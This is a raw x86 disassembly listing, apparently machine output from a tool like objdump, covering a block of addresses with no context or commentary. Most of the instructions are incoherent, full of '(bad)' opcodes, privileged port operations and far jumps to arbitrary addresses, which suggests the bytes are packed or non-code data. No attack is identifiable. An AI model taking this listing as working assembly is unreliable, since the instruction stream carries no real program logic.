  42624b:	xor    bh,BYTE PTR ds:0x6dd195a0
  426251:	fsub   QWORD PTR [eax-0x2ee21e1b]
  426257:	mov    cl,0xbb
  426259:	sbb    DWORD PTR ds:0xbb22d1e,0x49
  426260:	mov    esi,0xf26f418f
  426265:	xchg   BYTE PTR ds:0xcbc30b40,ch
  42626b:	in     eax,dx
  42626c:	cwde   
  42626d:	pop    ecx
  42626e:	jg     0x42621a
  426270:	pop    esi
  426271:	in     al,dx
  426272:	adc    BYTE PTR [ebp+0x74f50894],ch
  426278:	mov    al,ds:0x40000000
  42627d:	stos   BYTE PTR es:[edi],al
  42627e:	pop    edx
  42627f:	sbb    bh,dl
  426281:	cli    
  426282:	inc    eax
  426283:	cli    
  426284:	outs   dx,BYTE PTR ds:[esi]
  426285:	jmp    0x9000:0xb0aae400
  42628c:	call   0x8542646b
  426291:	add    al,BYTE PTR [eax]
  426293:	add    BYTE PTR ds:0x92385cb3,cl
  426299:	addr16 dec bp
  42629c:	popa   
  42629d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42629e:	cld    
  42629f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262a0:	mov    ch,0xd3
  4262a2:	jge    0x426315
  4262a4:	jae    0x426241
  4262a6:	adc    DWORD PTR [eax+0x74374d15],edi
  4262ac:	sahf   
  4262ad:	and    DWORD PTR [esi],0xfffffff2
  4262b0:	add    BYTE PTR [ebx-0x7c9df722],bh
  4262b6:	cld    
  4262b7:	jg     0x4262b6
  4262b9:	shl    DWORD PTR [edx+0x68],1
  4262bc:	pop    edx
  4262bd:	mov    bh,0x85
  4262bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262c0:	ret    
  4262c1:	dec    edx
  4262c2:	xchg   ebp,eax
  4262c3:	out    dx,eax
  4262c4:	in     al,0xb1
  4262c6:	sbb    DWORD PTR [edi-0x67],esp
  4262c9:	sbb    eax,0xb68ecd29
  4262ce:	mov    eax,ds:0xa1f82ae1
  4262d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262d4:	xor    edx,edi
  4262d6:	sti    
  4262d7:	loopne 0x426313
  4262d9:	clc    
  4262da:	hlt    
  4262db:	lods   al,BYTE PTR ds:[esi]
  4262dc:	rol    DWORD PTR [ebx+0x64],0x7f
  4262e0:	xchg   esp,eax
  4262e1:	or     al,BYTE PTR [edi]
  4262e3:	add    DWORD PTR [edx],edx
  4262e5:	mov    bh,0x4c
  4262e7:	fwait
  4262e8:	and    bh,ah
  4262ea:	pop    ebp
  4262eb:	retf   0xd564
  4262ee:	jnp    0x4262a1
  4262f0:	pop    esi
  4262f1:	jecxz  0x4262bc
  4262f3:	sbb    BYTE PTR [eax-0x7ea67db2],bl
  4262f9:	dec    ebx
  4262fa:	push   edx
  4262fb:	ds ret 
  4262fd:	jl     0x42635b
  4262ff:	ficom  WORD PTR ds:0xe712ec86
  426305:	(bad)  
  426306:	mov    ah,al
  426308:	call   0xf51d6e34
  42630d:	jmp    0x42636a
  42630f:	out    0x36,eax
  426311:	in     eax,dx
  426312:	push   es
  426313:	into   
  426314:	nop
  426315:	mov    al,ds:0x47b3c78d
  42631a:	sar    BYTE PTR [edx],1
  42631c:	test   al,0x4d
  42631e:	jmp    0x2af5:0xd483a4f1
  426325:	jg     0x426371
  426327:	fnstcw WORD PTR [edx-0x7]
  42632a:	test   eax,0x1a48dd69
  42632f:	push   esp
  426330:	sar    DWORD PTR [esi-0x3e],0x19
  426334:	adc    al,0x9
  426336:	fcomp  QWORD PTR [edx]
  426338:	or     al,0xff
  42633a:	cmovle edx,DWORD PTR [edi-0x41]
  42633e:	push   eax
  42633f:	pop    ecx
  426340:	out    0xdb,eax
  426342:	stos   DWORD PTR es:[edi],eax
  426343:	test   BYTE PTR [eax],0x55
  426346:	cld    
  426347:	xor    eax,0x39d719dd
  42634c:	pop    ebp
  42634d:	cwde   
  42634e:	sub    DWORD PTR [eax],0xf82514b5
  426354:	popa   
  426355:	xchg   edi,eax
  426356:	jnp    0x4263d1
  426358:	xor    eax,0xda8e7cb
  42635d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42635e:	or     bh,BYTE PTR [edi-0x4f]
  426361:	inc    esi
  426362:	pop    ebx
  426363:	pop    esi
  426364:	pop    ebx
  426365:	mov    ds:0x486b8bd7,al
  42636a:	mov    ch,0x2
  42636c:	sar    DWORD PTR [ecx+0x1409d8d8],1
  426372:	outs   dx,BYTE PTR ds:[esi]
  426373:	std    
  426374:	adc    ch,bh
  426376:	pop    es
  426377:	into   
  426378:	repnz xor eax,0x28b9c848
  42637e:	outs   dx,DWORD PTR ds:[esi]
  42637f:	imul   ecx,ecx,0x19
  426382:	clc    
  426383:	pop    edx
  426384:	shr    DWORD PTR [esi],0xf9
  426387:	or     eax,0xc75b4007
  42638c:	lea    eax,[esi-0x2d53fd8f]
  426392:	inc    eax
  426393:	mov    eax,ds:0x16982ae3
  426398:	das    
  426399:	sbb    al,0x46
  42639b:	sbb    bh,BYTE PTR [esi-0xc9c617]
  4263a1:	cld    
  4263a2:	(bad)  
  4263a3:	imul   ah
  4263a5:	cs jmp 0x2a4062a2
  4263ab:	jmp    0x5bd1:0xa41217bd
  4263b2:	ret    0x8523
  4263b5:	pop    edx
  4263b6:	fwait
  4263b7:	test   eax,0x7723b578
  4263bc:	add    al,0x29
  4263be:	jb     0x42643b
  4263c0:	pushf  
  4263c1:	shr    DWORD PTR ds:0x86dbabab,0xf
  4263c8:	jo     0x426430
  4263ca:	lods   al,BYTE PTR ds:[esi]
  4263cb:	aad    0x3f
  4263cd:	retf   0x3d0e
  4263d0:	stc    
  4263d1:	push   edx
  4263d2:	xchg   edx,eax
  4263d3:	repz mov ch,0x58
  4263d6:	cmp    ecx,DWORD PTR ds:0xda86cf37
  4263dc:	mov    al,0x2e
  4263de:	mov    ecx,0x40b58dc3
  4263e3:	push   0x7d5f6dcc
  4263e8:	jp     0x4263d8
  4263ea:	outs   dx,BYTE PTR ds:[esi]
  4263eb:	mov    eax,0x94599fe7
  4263f0:	mov    ebx,DWORD PTR [eax+eax*8]
  4263f3:	lea    esp,[ebx-0x7a]
  4263f6:	cmc    
  4263f7:	jg     0x4263d1
  4263f9:	das    
  4263fa:	xchg   ebp,eax
  4263fb:	ss dec edi
  4263fd:	add    DWORD PTR [edx],ebx
  4263ff:	repz push es
  426401:	cs sub ebx,0xaeb387d6
  426408:	mov    edi,0x3ada8e84
  42640d:	mov    eax,0x1f696f8b
  426412:	lea    ebx,[edi+0x5b]
  426415:	(bad)  [ebp+0x1c0689c4]
  42641b:	add    DWORD PTR [edx],ebp
  42641d:	das    
  42641e:	enter  0xaf7,0x8f
  426422:	and    ebx,ebp
  426424:	mov    dh,0x24
  426426:	xor    dl,0x22
  426429:	inc    esi
  42642a:	jl     0x426452
  42642c:	fwait
  42642d:	cmp    BYTE PTR [esp+ecx*1-0x1],dh
  426431:	or     al,0xbe
  426433:	mov    WORD PTR [ebp-0x38],?
  426436:	dec    ecx
  426437:	and    DWORD PTR [ecx],ebp
  426439:	mov    esp,0xbccf6eec
  42643e:	pop    esi
  42643f:	cli    
  426440:	jg     0x426406
  426442:	jp     0x4263d3
  426444:	and    al,0xaf
  426446:	repz pop ss
  426448:	mov    ds:0xe14fada1,al
  42644d:	xor    esi,0x6f
  426450:	mov    ds:0xd724a6b0,eax
  426455:	icebp  
  426456:	sbb    bh,ch
  426458:	in     eax,0x9
  42645a:	cmc    
  42645b:	and    eax,0x7ca167ac
  426460:	mov    esp,0xf931323e
  426465:	jns    0x4264aa
  426467:	jb     0x426412
  426469:	mov    dh,dl
  42646b:	xchg   esp,eax
  42646c:	jne    0x426412
  42646e:	jno    0x42645f
  426470:	lahf   
  426471:	jge    0x42649a
  426473:	push   0x2f
  426475:	hlt    
  426476:	ins    DWORD PTR es:[edi],dx
  426477:	pusha  
  426478:	and    DWORD PTR [edx+0x50d10a48],ebp
  42647e:	aam    0x2b
  426480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426481:	and    esi,DWORD PTR [edi-0x24]
  426484:	inc    ebx
  426485:	and    al,0xb3
  426487:	bound  ebp,QWORD PTR [edx-0x6bea254b]
  42648d:	add    DWORD PTR [edx],ebp
  42648f:	cmp    eax,DWORD PTR es:0x9dee6042
  426496:	out    0x83,eax
  426498:	pop    eax
  426499:	mul    BYTE PTR [ebp+0x9e099e9]
  42649f:	sbb    esp,DWORD PTR [eax+0x36]
  4264a2:	jp     0x426456
  4264a4:	push   ebp
  4264a5:	hlt    
  4264a6:	mov    esp,0x9dd8d469
  4264ab:	jmp    0xa066:0x2583ff1b
  4264b2:	test   DWORD PTR [eax+0x6],edi
  4264b5:	fcom   QWORD PTR [ecx+0x6f48f4e1]
  4264bb:	fldcw  WORD PTR [eax+ebx*2]
  4264be:	push   esi
  4264bf:	mov    ch,0x99
  4264c1:	pusha  
  4264c2:	ss jmp 0x3bc5:0x9f1e75c1
  4264ca:	arpl   WORD PTR [ebx-0x49],cx
  4264cd:	rcl    BYTE PTR [eax+0x1b],1
  4264d0:	lds    edx,FWORD PTR [edx+0x25f1a59b]
  4264d6:	ds dec ecx
  4264d8:	mov    ecx,0xe310b273
  4264dd:	mov    ch,0x55
  4264df:	rol    BYTE PTR ds:0x7f723547,1
  4264e5:	mov    dh,0x74
  4264e7:	push   esp
  4264e8:	push   0x43b4919d
  4264ed:	lahf   
  4264ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264ef:	icebp  
  4264f0:	xchg   esi,eax
  4264f1:	jecxz  0x4264e2
  4264f3:	aam    0xa
  4264f5:	loopne 0x426547
  4264f7:	add    esp,DWORD PTR [ecx+0x666ac581]
  4264fd:	loopne 0x4264c1
  4264ff:	(bad)  
  426500:	retf   0xe3c
  426503:	push   0xac76722e
  426508:	addr16 jnp 0x4264d1
  42650b:	xor    BYTE PTR [esp+edx*8+0x4f],dl
  42650f:	push   ebp
  426510:	pop    ss
  426511:	retf   0x108
  426514:	inc    edx
  426515:	fs pop ds
  426517:	jecxz  0x4264a8
  426519:	add    BYTE PTR [eax],al
  42651b:	add    BYTE PTR [esi-0x28ab281c],dh
  426521:	ja     0x4264da
  426523:	out    0xf3,al
  426525:	ss icebp 
  426527:	mov    esp,0xd303d4d1
  42652c:	ins    DWORD PTR es:[edi],dx
  42652d:	fld    QWORD PTR [ecx]
  42652f:	add    BYTE PTR [ebp-0x7dfffffe],al
  426535:	adc    dh,dl
  426537:	mov    dh,0x74
  426539:	addr16 fldpi 
  42653c:	into   
  42653d:	lahf   
  42653e:	or     DWORD PTR [edi+0x31276113],edx
  426544:	pop    eax
  426545:	addr16 out dx,eax
  426547:	pusha  
  426548:	lds    ebp,FWORD PTR [ebx+eiz*1]
  42654b:	xor    eax,eax
  42654d:	or     eax,0x5c3f970e
  426552:	lahf   
  426553:	sub    BYTE PTR [esp+eiz*4],dh
  426556:	xchg   ebx,eax
  426557:	(bad)  
  426558:	jecxz  0x42658f
  42655a:	fidivr DWORD PTR [eax]
  42655c:	add    eax,0x12987a28
  426561:	loop   0x426565
  426563:	xchg   edx,eax
  426564:	shl    DWORD PTR [esi+0x7ffe38e5],cl
  42656a:	xchg   edx,eax
  42656b:	add    BYTE PTR [edx+0x60],dh
  42656e:	xchg   ecx,eax
  42656f:	or     bl,BYTE PTR [ebp-0x2f]
  426572:	mov    ebp,0xf834e825
  426577:	jo     0x42658f
  426579:	add    esi,DWORD PTR [edx-0x80]
  42657c:	cs inc eax
  42657e:	add    eax,0xb5a0dc51
  426583:	or     BYTE PTR [eax-0x7152c9ab],dh
  426589:	out    dx,eax
  42658a:	add    ecx,DWORD PTR [eax]
  42658c:	mov    ebx,0x1fcfcf1d
  426591:	(bad)  
  426592:	aas    
  426593:	cli    
  426594:	mov    dl,0x3e
  426596:	jge    0x426558
  426598:	push   esp
  426599:	inc    BYTE PTR [ebp-0x5e]
  42659c:	loopne 0x426603
  42659e:	mov    ds:0x1b744b12,eax
  4265a3:	call   0x5960c89e
  4265a8:	sub    edx,edx
  4265aa:	xchg   edi,eax
  4265ab:	aam    0x99
  4265ad:	cli    
  4265ae:	inc    esp
  4265af:	and    al,0xb3
  4265b1:	sbb    DWORD PTR [eax+0x588d119a],esi
  4265b7:	test   DWORD PTR [edx+edi*2],0x4b70a822
  4265be:	add    bl,BYTE PTR [ebx+0xa1524e4]
  4265c4:	dec    eax
  4265c5:	push   ss
  4265c6:	ret    0x3112
  4265c9:	and    eax,0x273fc7c2
  4265ce:	cmp    dl,al
  4265d0:	jecxz  0x42657c
  4265d2:	pop    edi
  4265d3:	xlat   BYTE PTR ds:[ebx]
  4265d4:	jmp    0x8487:0xca48aee6
  4265db:	cmp    al,0xc4
  4265dd:	inc    ecx
  4265de:	retf   
  4265df:	xor    eax,0x2e0fd66c
  4265e4:	mov    WORD PTR ss:[eax],es
  4265e7:	cmp    eax,0xa4cdaffb
  4265ec:	test   BYTE PTR [edx],0x83
  4265ef:	inc    esi
  4265f0:	mov    edi,DWORD PTR [edx]
  4265f2:	sar    BYTE PTR [eax+eax*8],0xf8
  4265f6:	jns    0x4265b7
  4265f8:	(bad)  
  4265f9:	enter  0x38d7,0xee
  4265fd:	mov    BYTE PTR [ebp+0x76003480],dh
  426603:	(bad)  
  426604:	mov    bl,0x32
  426606:	inc    esi
  426607:	in     al,0xb9
  426609:	push   es
  42660a:	pop    es
  42660b:	mov    cl,0x79
  42660d:	pop    ecx
  42660e:	popa   
  42660f:	jp     0x426665
  426611:	xchg   esi,eax
  426612:	mov    ?,WORD PTR [eax+0x2c128c61]
  426618:	int    0x3d
  42661a:	adc    al,0x82
  42661c:	int3   
  42661d:	dec    ecx
  42661e:	loop   0x426663
  426620:	shr    DWORD PTR [ecx-0x47],0x81
  426624:	dec    esi
  426625:	cld    
  426626:	mov    dh,0xf
  426628:	repz push eax
  42662a:	test   DWORD PTR [esi],esi
  42662c:	cmp    eax,0xccdf1997
  426631:	(bad)  
  426632:	push   edx
  426633:	fistp  DWORD PTR [ebx-0x62363290]
  426639:	fwait
  42663a:	hlt    
  42663b:	mov    esp,0xe1c8491
  426640:	test   eax,0x2b5ed115
  426645:	jae    0x426632
  426647:	push   ecx
  426648:	test   al,0x51
  42664a:	push   ss
  42664b:	in     eax,0x4c
  42664d:	push   eax
  42664e:	test   al,0xb2
  426650:	ret    0x2da0
  426653:	lods   al,BYTE PTR ds:[esi]
  426654:	push   edx
  426655:	jb     0x42661d
  426657:	das    
  426658:	cmp    cl,ch
  42665a:	(bad)  
  42665b:	xchg   edx,eax
  42665c:	mov    cl,0x71
  42665e:	and    al,0x71
  426660:	mov    ebx,0xffc81991
  426665:	xchg   ebx,eax
  426666:	inc    esp
  426667:	push   cs
  426668:	push   eax
  426669:	(bad)  
  42666a:	sub    bl,BYTE PTR [ebp+eax*8-0x1c9f034e]
  426671:	in     al,0xd9
  426673:	and    esp,DWORD PTR [edi+0x5aa7871a]
  426679:	mov    dl,0x6e
  42667b:	mov    al,ds:0xe3493d11
  426680:	sar    BYTE PTR [edi-0x19],0xbe
  426684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426685:	test   eax,0xd19c8a0d
  42668a:	add    al,0x58
  42668c:	(bad)  ds:0xab1645c2
  426692:	call   0xa873:0x6699f970
  426699:	std    
  42669a:	jnp    0x42663d
  42669c:	fwait
  42669d:	(bad)  
  42669e:	push   edi
  42669f:	outs   dx,DWORD PTR ds:[esi]
  4266a0:	rcl    DWORD PTR [edx+0x1f581792],1
  4266a6:	jl     0x426699
  4266a8:	push   ebp
  4266a9:	cmc    
  4266aa:	mov    edx,0x914ff840
  4266af:	pop    ebp
  4266b0:	jnp    0x426645
  4266b2:	push   cs
  4266b3:	ret    
  4266b4:	(bad)  
  4266b5:	jl     0x42668d
  4266b7:	add    esi,ecx
  4266b9:	mov    ss,WORD PTR [ebx-0x62e1d307]
  4266bf:	aad    0xcc
  4266c1:	sbb    esi,DWORD PTR [edx-0x51]
  4266c4:	add    BYTE PTR [eax+0x11],cl
  4266c7:	or     al,0xce
  4266c9:	sub    BYTE PTR [edi-0x54],bh
  4266cc:	ins    BYTE PTR es:[edi],dx
  4266cd:	pop    es
  4266ce:	sub    BYTE PTR [ecx*8+0x77d6642e],0x98
  4266d6:	mov    ch,0xa3
  4266d8:	outs   dx,DWORD PTR ds:[esi]
  4266d9:	add    cl,bl
  4266db:	sbb    al,0x92
  4266dd:	push   ebx
  4266de:	push   DWORD PTR [eax]
  4266e0:	mov    ds:0xb4984bb8,al
  4266e5:	(bad)  
  4266e6:	mov    dl,0x24
  4266e8:	dec    edi
  4266e9:	and    BYTE PTR [ecx+0x51eb1f81],bh
  4266ef:	jp     0x426733
  4266f1:	es or  al,0x57
  4266f4:	outs   dx,DWORD PTR ds:[esi]
  4266f5:	dec    esi
  4266f6:	push   edx
  4266f7:	in     eax,0x2b
  4266f9:	cs (bad) 
  4266fb:	sbb    DWORD PTR [ecx-0x48],edi
  4266fe:	sub    edx,ebx
  426700:	jne    0x42675b
  426702:	ins    BYTE PTR es:[edi],dx
  426703:	icebp  
  426704:	(bad)
  426707:	cli    
  426708:	(bad)  
  426709:	sbb    eax,0xad275393
  42670e:	popf   
  42670f:	stos   BYTE PTR es:[edi],al
  426710:	xchg   edx,eax
  426711:	fld    QWORD PTR [edi+ebx*4-0x240c6d87]
  426718:	dec    edi
  426719:	imul   edx,edx,0xa5f53e38
  42671f:	jb     0x4266dd
  426721:	jge    0x426718
  426723:	push   0xdf4d3d04
  426728:	and    eax,0x9543e741
  42672d:	cli    
  42672e:	push   ds
  42672f:	call   0x47493e26
  426734:	fcom   st(1)
  426736:	fiadd  DWORD PTR [esi-0x29df129c]
  42673c:	in     eax,dx
  42673d:	xchg   ebp,eax
  42673e:	mov    bh,0x4f
  426740:	push   edx
  426741:	push   cs
  426742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426743:	jge    0x42673d
  426745:	cmp    eax,0x5aa293c0
  42674a:	cmp    esp,DWORD PTR [esi-0x118e8811]
  426750:	cmp    al,0xd1
  426752:	jmp    0xbeed:0x8d2934ee
  426759:	pop    ecx
  42675a:	or     ebp,DWORD PTR [ebx-0x70]
  42675d:	icebp  
  42675e:	cmp    ebx,DWORD PTR [ebx+0x710428f]
  426764:	and    eax,0x2116e4d6
  426769:	arpl   WORD PTR [edi+0x3c],sp
  42676c:	inc    esi
  42676d:	in     al,0x5f
  42676f:	cmp    DWORD PTR [esi-0x3f286907],eax
  426775:	sub    DWORD PTR [edx-0x3a],esi
  426778:	push   0x189db2a3
  42677d:	into   
  42677e:	fisttp DWORD PTR [ebx+0x6f]
  426781:	pop    ss
  426782:	and    bh,BYTE PTR [eax]
  426784:	pop    edx
  426785:	inc    esp
  426786:	sub    edi,edx
  426788:	into   
  426789:	ficomp WORD PTR [edx-0x7527e1b3]
  42678f:	inc    ebx
  426790:	(bad)  
  426791:	xor    BYTE PTR [eax+0x79],dl
  426794:	sbb    eax,0x2d141df2
  426799:	inc    eax
  42679a:	mov    edx,0x8bc29573
  42679f:	pop    ebp
  4267a0:	mov    ecx,0xb7d8930b
  4267a5:	lods   al,BYTE PTR ds:[esi]
  4267a6:	out    dx,al
  4267a7:	nop
  4267a8:	push   ebp
  4267a9:	inc    esi
  4267aa:	(bad)  
  4267ab:	cli    
  4267ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267ad:	fidivr DWORD PTR [esi]
  4267af:	repnz xlat BYTE PTR es:[ebx]
  4267b2:	int    0x9e
  4267b4:	and    eax,0x9346d2
  4267ba:	add    BYTE PTR [eax],al
  4267bc:	cli    
  4267bd:	rcl    DWORD PTR ds:0xfac73d07,cl
  4267c3:	push   DWORD PTR ds:0x531c7bfe
  4267c9:	int    0x7e
  4267cb:	jge    0x4267bf
  4267cd:	fild   WORD PTR [ecx]
  4267cf:	add    BYTE PTR [ebp+0x7c000002],al
  4267d5:	push   eax
  4267d6:	xor    al,0x4c
  4267d8:	ret    0xa397
  4267db:	xor    edi,ebp
  4267dd:	mov    edx,edx
  4267df:	nop
  4267e0:	push   ss
  4267e1:	add    dl,ch
  4267e3:	add    eax,0xed2d5c6b
  4267e8:	pop    ds
  4267e9:	mov    DWORD PTR [ebx+0x29a42a95],esi
  4267ef:	mov    ah,0x3f
  4267f1:	cmp    al,0x13
  4267f3:	mov    esi,es
  4267f5:	and    dh,BYTE PTR [ebp-0x7b]
  4267f8:	jle    0x426802
  4267fa:	push   edx
  4267fb:	jmp    0xc769:0x13285690
  426802:	xchg   edx,eax
  426803:	rcr    DWORD PTR [ebx+0x3d6b4b09],0x8c
  42680a:	inc    BYTE PTR [esi+ebx*8+0x1a]
  42680e:	test   DWORD PTR [ebx+0x6180ed39],ebx
  426814:	sahf   
  426815:	sbb    al,0xe
  426817:	cli    
  426818:	xor    edi,eax
  42681a:	mov    edx,0x1b713923
  42681f:	nop
  426820:	icebp  
  426821:	inc    ebx
  426822:	dec    edi
  426823:	cmp    BYTE PTR [edx-0x52fac871],bh
  426829:	and    cl,dh
  42682b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42682c:	test   DWORD PTR [esi+0x7148f76],0x42d5b1ad
  426836:	push   ss
  426837:	fidivr WORD PTR [edi-0x17]
  42683a:	sub    DWORD PTR [edi],0xfffffff7
  42683d:	ins    DWORD PTR es:[edi],dx
  42683e:	adc    BYTE PTR [edi+0x7b],0x49
  426842:	push   0xffffff86
  426844:	jle    0x42682e
  426846:	or     al,0x63
  426848:	scas   eax,DWORD PTR es:[edi]
  426849:	jle    0x42687a
  42684b:	test   eax,0x577d9477
  426850:	mov    ah,0x59
  426852:	adc    DWORD PTR [edx+0xd57ce4a],edi
  426858:	jns    0x426811
  42685a:	mov    ch,0xdb
  42685c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685d:	lods   eax,DWORD PTR ds:[esi]
  42685e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42685f:	mul    BYTE PTR [ecx]
  426861:	mov    ecx,0x61c45d3c
  426866:	cld    
  426867:	repz xor eax,DWORD PTR [edx-0x6007e99b]
  42686e:	pop    es
  42686f:	test   DWORD PTR [edx-0x4e],ebx
  426872:	mov    ebx,0xc1a0428a
  426877:	xchg   ebx,eax
  426878:	push   ebx
  426879:	inc    ecx
  42687a:	jmp    0x5692:0x564cbaba
  426881:	mov    ebx,0xf5befa8
  426886:	out    0xef,eax
  426888:	hlt    
  426889:	leave  
  42688a:	push   esi
  42688b:	imul   eax,esp,0x7f63887
  426891:	adc    eax,0xfe92f3d3
  426896:	add    DWORD PTR [ecx+0x1070807c],eax
  42689c:	mov    al,ds:0x52438157
  4268a1:	adc    DWORD PTR [edi-0x6f91e1d9],ebp
  4268a7:	popf   
  4268a8:	(bad)  
  4268aa:	or     dh,BYTE PTR [ecx-0x23a6296d]
  4268b0:	xchg   BYTE PTR [ebx-0x41],cl
  4268b3:	lods   eax,DWORD PTR ds:[esi]
  4268b4:	adc    cl,BYTE PTR [ebx+0x9322eb8]
  4268ba:	shr    cl,cl
  4268bc:	mov    dl,0x80
  4268be:	dec    eax
  4268bf:	add    DWORD PTR [edx],0xffffffa0
  4268c2:	mov    bl,0x1c
  4268c4:	cdq    
  4268c5:	fsub   DWORD PTR [esi]
  4268c7:	aad    0x63
  4268c9:	(bad)  
  4268ca:	pop    ebx
  4268cb:	inc    esi
  4268cc:	mov    bh,0x71
  4268ce:	xchg   DWORD PTR [edi+0x50b1f083],edx
  4268d4:	ds out dx,al
  4268d6:	jl     0x4268e6
  4268d8:	ret    
  4268d9:	push   0x70
  4268db:	jg     0x426860
  4268dd:	and    DWORD PTR [edi],esi
  4268df:	push   ebx
  4268e0:	jne    0x42691a
  4268e2:	sub    DWORD PTR [ebx],eax
  4268e4:	and    eax,0xa6efb38f
  4268e9:	pop    ecx
  4268ea:	adc    ax,WORD PTR [ecx-0x4b]
  4268ee:	ds sbb ch,bl
  4268f1:	jmp    0x4268f2
  4268f3:	xor    DWORD PTR ds:0xa017e520,esi
  4268f9:	jl     0x426950
  4268fb:	mov    dh,BYTE PTR [esi-0x63]
  4268fe:	mov    ds:0x7eb4f1d6,eax
  426903:	loope  0x426946
  426905:	sbb    DWORD PTR [edx-0x7c],esi
  426908:	and    BYTE PTR [esi+0x22],al
  42690b:	mov    edi,0xb159927
  426910:	setl   BYTE PTR [edi]
  426913:	and    BYTE PTR [eax+0x5e],dl
  426916:	clc    
  426917:	mov    esp,0x76d99e14
  42691c:	jmp    0x6f29:0x139de306
  426923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426924:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426926:	shr    DWORD PTR [ecx+0x61],1
  426929:	xchg   DWORD PTR [ecx+0x292836f],eax
  42692f:	out    0x28,eax
  426931:	push   ds
  426932:	sub    al,0xc9
  426934:	xor    dh,BYTE PTR ds:0x8847643e
  42693a:	je     0x4268e2
  42693c:	iret   
  42693d:	fiadd  DWORD PTR [ebx+ecx*8+0x18e9ee8]
  426944:	jmp    0x3aa9dd55
  426949:	fcmovnbe st,st(0)
  42694b:	mov    al,ds:0x455aa332
  426950:	cli    
  426951:	popf   
  426952:	lods   eax,DWORD PTR ds:[esi]
  426953:	jo     0x426984
  426955:	das    
  426956:	sub    ebx,DWORD PTR ds:0x2081f3ca
  42695c:	mov    DWORD PTR [ebx],eax
  42695e:	lock push eax
  426960:	xchg   esi,eax
  426961:	xor    BYTE PTR [edi+0x3ba198ad],bh
  426967:	xchg   ebx,eax
  426968:	ficom  WORD PTR [ecx-0x609258b3]
  42696e:	pop    edi
  42696f:	xchg   DWORD PTR [ebx+0x1382a9fe],ecx
  426975:	jns    0x42693a
  426977:	ret    0xf346
  42697a:	inc    ecx
  42697b:	pop    edx
  42697c:	add    BYTE PTR ds:0x500d53aa,al
  426982:	loopne 0x426937
  426984:	jp     0x426989
  426986:	int    0xb8
  426988:	lock jmp 0x695b46af
  42698e:	mov    ds:0xef4b632a,al
  426993:	loope  0x42691f
  426995:	pop    es
  426996:	push   eax
  426997:	sub    ebp,DWORD PTR [ebx-0x59]
  42699a:	shr    DWORD PTR [ecx-0x44],1
  42699d:	nop
  42699e:	adc    esp,DWORD PTR [ebx-0x5d]
  4269a1:	dec    ebp
  4269a2:	clc    
  4269a3:	fst    DWORD PTR [ebx]
  4269a5:	imul   ebp,eax,0x27
  4269a8:	push   0x952ef209
  4269ad:	adc    eax,0x353c6993
  4269b2:	or     BYTE PTR [eax],bl
  4269b4:	popf   
  4269b5:	outs   dx,DWORD PTR ds:[esi]
  4269b6:	mov    bh,0x80
  4269b8:	cmp    eax,0x59c0b542
  4269bd:	jmp    0xfae52ce7
  4269c2:	out    dx,eax
  4269c3:	push   esi
  4269c4:	(bad)  
  4269c7:	push   edx
  4269c8:	mov    al,0x5d
  4269ca:	inc    edx
  4269cb:	cwde   
  4269cc:	pop    es
  4269cd:	fwait
  4269ce:	std    
  4269cf:	loop   0x426984
  4269d1:	xlat   BYTE PTR ds:[ebx]
  4269d2:	aaa    
  4269d3:	mov    ecx,0x6bbb8d9e
  4269d8:	add    BYTE PTR [ebp-0x4c],dh
  4269db:	adc    cl,cl
  4269dd:	aad    0x44
  4269df:	loop   0x42699a
  4269e1:	and    al,0x4f
  4269e3:	aaa    
  4269e4:	pop    esi
  4269e5:	shr    edi,0xdf
  4269e8:	addr16 cwde 
  4269ea:	cdq    
  4269eb:	(bad)  
  4269ec:	pop    ds
  4269ed:	jne    0x426a61
  4269ef:	ds xor eax,0xfe0b5479
  4269f5:	test   bl,cl
  4269f7:	and    esi,0x2ecbbb78
  4269fd:	repnz retf 
  4269ff:	stos   BYTE PTR es:[edi],al
  426a00:	adc    eax,0xd17f1daf
  426a05:	push   esi
  426a06:	jl     0x4269c5
  426a08:	mov    bl,0x6d
  426a0a:	push   ebp
  426a0b:	jae    0x426a0f
  426a0d:	fstp   QWORD PTR [ebp+0xc]
  426a10:	scas   eax,DWORD PTR es:[edi]
  426a11:	iret   
  426a12:	lock dec edi
  426a14:	mov    ecx,DWORD PTR [esp+ecx*2]
  426a17:	jmp    0x426a76
  426a19:	pop    ebp
  426a1a:	sbb    eax,0xaeb15670
  426a1f:	call   0xed69997e
  426a24:	add    edx,edx
  426a26:	xchg   esi,eax
  426a27:	mov    ch,0x6
  426a29:	pushf  
  426a2a:	mul    DWORD PTR [ebp+0x2c]
  426a2d:	fisubr WORD PTR [ebx-0x2af6b4e4]
  426a33:	sub    DWORD PTR [eax-0x4e24aee6],ebp
  426a39:	imul   edi,DWORD PTR [ecx],0x61
  426a3c:	and    DWORD PTR [ebx-0x50314409],esp
  426a42:	fdivr  QWORD PTR [ecx-0x6e73bd19]
  426a48:	daa    
  426a49:	xor    BYTE PTR [ebx],ch
  426a4b:	sbb    DWORD PTR [ebp-0x521125a3],ebp
  426a51:	fsub   QWORD PTR [edx-0x35aca296]
  426a57:	mov    al,ds:0xb5
  426a5c:	iret   
  426a5d:	neg    BYTE PTR [ebp-0x308442b0]
  426a63:	(bad)  
  426a64:	out    dx,eax
  426a65:	lods   al,BYTE PTR ds:[esi]
  426a66:	(bad)  
  426a67:	push   ss
  426a68:	jg     0x426a93
  426a6a:	ds mov edi,0x1e277
  426a70:	test   DWORD PTR [edx],eax
  426a72:	add    BYTE PTR [eax],al
  426a74:	sub    esp,DWORD PTR [ebx+0x50]
  426a77:	es mov cl,0xa2
  426a7a:	xchg   ecx,eax
  426a7b:	push   0xffffffd6
  426a7d:	test   ch,0x23
  426a80:	xchg   ecx,eax
